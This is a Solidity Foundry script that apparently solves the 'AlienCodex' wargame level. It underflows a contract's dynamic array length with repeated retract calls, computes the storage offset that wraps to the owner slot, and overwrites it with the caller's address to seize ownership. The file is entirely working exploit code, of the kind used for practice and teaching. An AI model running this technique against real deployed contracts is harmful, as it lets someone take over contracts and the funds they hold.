// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;
import "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexAttackScript is Script {
    function setUp() public {}

    function run() public {
        IAlienCodex target = IAlienCodex(0x0000000000000000000000000000000000000000); // Insert target target address

        vm.startBroadcast();

        // Make contact
        target.makeContact();

        // Init array
        target.record(bytes32(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff));

        // Underflow array length
        target.retract();
        target.retract();

        // Compute Owner's slot offset referenced to array index 0 slot
        // Owner is in slot 0000000000000000000000000000000000000000000000000000000000000000
        // Array is in slot 0000000000000000000000000000000000000000000000000000000000000001
        // Array[0] is in slot H(0x0000000000000000000000000000000000000000000000000000000000000001) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
        // To write Owner's slot we have to write array[offset],
        // where offset = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0x0000000000000000000000000000000000000000000000000000000000000001

        uint256 offset = uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
            - uint256(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
            + uint256(0x0000000000000000000000000000000000000000000000000000000000000001);

        (VmSafe.CallerMode callerMode, address msgSender, address txOrigin) = vm.readCallers();
        // change ownership
        target.revise(offset, bytes32(uint256(uint160(msgSender)))); 

        vm.stopBroadcast();
    }
}
